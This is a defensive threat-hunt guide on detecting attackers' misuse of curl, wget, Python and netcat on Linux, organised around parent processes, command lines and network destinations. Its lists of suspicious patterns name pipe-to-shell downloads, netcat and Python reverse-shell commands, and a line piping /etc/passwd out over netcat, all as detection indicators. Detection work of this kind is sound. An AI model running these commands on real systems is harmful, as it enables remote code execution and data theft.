# Threat Hunt: Linux LOLBin Abuse — Curl, Wget, Python, and Netcat

## Overview

Linux systems ship with a set of powerful native utilities that attackers routinely abuse for payload delivery, remote code execution, reverse shell establishment, and data exfiltration. Unlike custom malware, these tools are trusted, expected, and actively used in most enterprise Linux environments — making detection dependent on context, parent process relationships, and behavioral patterns rather than the presence of the binary itself.

This hunt targets four commonly abused Linux utilities: curl and wget as download cradles and exfiltration tools, python and python3 for inline code execution and reverse shells, and netcat variants (nc, ncat) for reverse shell establishment and data transfer.

---

## Hunt Hypothesis

If attackers are abusing native Linux utilities for post-exploitation activity, evidence should appear in process creation telemetry as anomalous command-line patterns, suspicious parent process relationships, or outbound network connections to unexpected external destinations initiated by these binaries.

Potential indicators may include:

- Curl or wget invocations referencing unusual external domains or IP addresses
- Curl or wget spawning shell interpreter child processes (pipe-to-shell pattern)
- Python or python3 invocations using the `-c` flag to execute inline code
- Python command lines referencing socket, subprocess, os, or pty modules
- Netcat invocations using the `-e` flag or connecting to unusual external destinations
- These utilities spawned by web server processes, databases, or other unexpected parents

---

## Data Sources

This hunt may require visibility into the following telemetry sources:

- Endpoint process creation logs (auditd, EDR agent)
- Linux command-line argument logging
- Network connection telemetry
- DNS query logs
- Parent-child process relationship data

---

## Hunt Technique 1: Curl and Wget Downloading from External Sources

Curl and wget are the most common download cradles observed in Linux post-exploitation. Attackers use them to pull payloads, scripts, and additional tooling from attacker-controlled infrastructure. The most dangerous pattern is piping downloaded content directly to a shell interpreter — execution with no file ever written to disk.

Hunt for curl and wget invocations referencing external URLs or unusual IP addresses, particularly where the command line suggests the output is being piped to an interpreter or written to a sensitive location.

**Suspicious patterns to look for:**

- `curl <url> | bash` or `curl <url> | sh` — pipe-to-shell fileless execution
- `wget -O- <url> | bash` — wget equivalent of the above
- `curl -s <url> -o /tmp/<name>` — download to temp directory
- `wget --quiet <url> -O /dev/shm/<name>` — download to memory-backed filesystem
- Output redirected to `/tmp/`, `/dev/shm/`, `/var/tmp/`, or `/root/`
- Curl or wget spawned by web server processes (apache2, nginx, httpd, tomcat)

**Notes:**

Curl and wget are legitimately used constantly in enterprise Linux environments for package downloads, API calls, and automated processes. Effective hunting requires baselining expected destinations and parent processes first. Focus on external IP addresses (not hostnames associated with known package repos), non-standard ports, and invocations by processes that have no legitimate reason to download content from the internet.

When filtering for unusual IP addresses in platform queries, exclude RFC 1918 private address ranges (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16) and loopback (127.0.0.1) to reduce noise from internal tooling, configuration management agents, and monitoring systems. Connections to private addresses may still warrant investigation in specific contexts but should be scoped separately from external destination hunting.

---

## Hunt Technique 2: Python Inline Code Execution

Python's `-c` flag allows arbitrary code to be passed directly on the command line without writing a script file to disk. This is one of the most commonly observed techniques for establishing reverse shells and executing payloads on Linux systems. The pattern is recognizable — short, dense Python code referencing networking or subprocess modules passed as a single command-line argument.

Hunt for python and python3 process creation events where the command line contains `-c` followed by code referencing suspicious modules or functionality.

**Suspicious patterns to look for:**

- `python3 -c "import socket,subprocess,os;..."` — reverse shell skeleton
- `python -c "import pty;pty.spawn('/bin/bash')"` — TTY shell upgrade
- `python3 -c "exec(__import__('base64').b64decode(...))"` — base64 encoded payload
- Python `-c` invocations referencing `socket`, `subprocess`, `os.dup2`, `pty`
- Python spawned by web server or database processes
- Python writing files to `/tmp/` or `/dev/shm/`

**Notes:**

Python is deeply embedded in Linux system administration and application stacks. The `-c` flag itself is legitimately used for one-liners. Focus on command lines that reference networking modules (`socket`) combined with subprocess or shell spawning (`subprocess`, `os.system`, `pty`) — this combination is a strong reverse shell indicator. Encoded payloads (base64 in the command line) are also high-fidelity.

---

## Hunt Technique 3: Netcat Reverse Shell and Data Transfer

Netcat and its variants (nc, ncat) are networking utilities commonly used for diagnostics and connectivity testing. Attackers abuse netcat to establish reverse shells — connections from the compromised host back to attacker infrastructure — and for exfiltrating data by piping file contents across network connections.

Hunt for netcat invocations using flags associated with program execution or connecting to unusual external destinations.

**Suspicious patterns to look for:**

- `nc -e /bin/bash <ip> <port>` — classic reverse shell with `-e` flag
- `ncat --exec /bin/bash <ip> <port>` — ncat variant
- `nc -lvnp <port>` on a server (listener being set up)
- Netcat connecting to non-standard ports (not 80, 443, 22) on external IPs
- `cat /etc/passwd | nc <ip> <port>` — exfiltration pattern
- Netcat spawned by web server, cron, or other unexpected parent processes
- `ncat --ssl` — encrypted reverse shell to evade network inspection

**Notes:**

Some Linux distributions ship netcat without the `-e` flag (the OpenBSD version) as a security measure. In those environments, attackers may use named pipes (`mkfifo`) to achieve the same result or switch to ncat. Ncat from the Nmap suite supports SSL encryption, making it harder to detect at the network layer. Focus on parent process relationships and destination IPs/ports rather than just command-line flags.

When hunting for netcat connections to unusual external IPs, exclude RFC 1918 private ranges (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16) and loopback (127.0.0.1) to cut noise from legitimate internal use. Reverse shells and exfiltration activity will almost always target external IPs, so this filter has minimal impact on detection fidelity while significantly reducing result volume.

---

## Hunt Technique 4: Anomalous Parent Processes Spawning LOLBins

The parent process context for any of these utilities is one of the strongest triage signals available. In most legitimate usage, curl, wget, python, and netcat are invoked interactively by users or by known automated processes with predictable command patterns. When these utilities are spawned by processes that have no legitimate reason to invoke them — web servers, databases, cron jobs running unexpected scripts — it is a strong indicator of post-exploitation activity.

Hunt for curl, wget, python/python3, nc, or ncat spawned by unexpected parent processes.

**High-priority parent processes to investigate:**

- Web servers: `apache2`, `nginx`, `httpd`, `tomcat`, `java` (running web apps)
- Databases: `mysql`, `mysqld`, `postgres`, `mongod`
- Application processes with no expected network download behavior
- `cron` or `at` jobs spawning these utilities with unusual arguments
- Container entry points behaving unexpectedly

**Notes:**

Web server and application processes spawning these utilities is a strong indicator of web shell activity or exploitation of a web application vulnerability. This is one of the highest-fidelity signals available because there are very few legitimate scenarios where nginx or apache2 should be invoking curl to download content from an external IP. Correlate with web server access logs where available to identify the request that triggered the execution.

---

## Investigation Considerations

If suspicious activity is identified during this hunt, investigators should consider the following:

- What is the full command line and what external destination was contacted?
- What is the parent process and how was it invoked?
- Did a network connection to an external IP or unusual port accompany the execution?
- Are there additional processes spawned as children of these utilities (interactive shell, subsequent commands)?
- Is there evidence of file writes to `/tmp/`, `/dev/shm/`, or `/var/tmp/`?
- Does the destination IP or domain appear in threat intelligence feeds?
- Is there evidence of lateral movement or credential access following the initial execution?

---

## Conclusion

Curl, wget, Python, and netcat are essential Linux utilities that will be present and in active use in virtually every enterprise Linux environment. Effective detection of their abuse requires moving beyond the binary itself and focusing on behavioral context — the parent process that spawned them, the arguments passed, the network destinations contacted, and the child processes they create. Establishing baselines for legitimate usage in a given environment is a prerequisite for meaningful hunting, but the highest-fidelity signals — web server processes spawning download tools, Python one-liners referencing socket and subprocess, netcat using the `-e` flag — translate broadly across environments and warrant investigation regardless of baseline.

---

## Related Research

This threat hunt builds upon the research documented in:
- [Linux LOLBin Abuse — Curl, Wget, Python, and Netcat](../research/linux_lolbins_curl_wget_python_netcat.md)
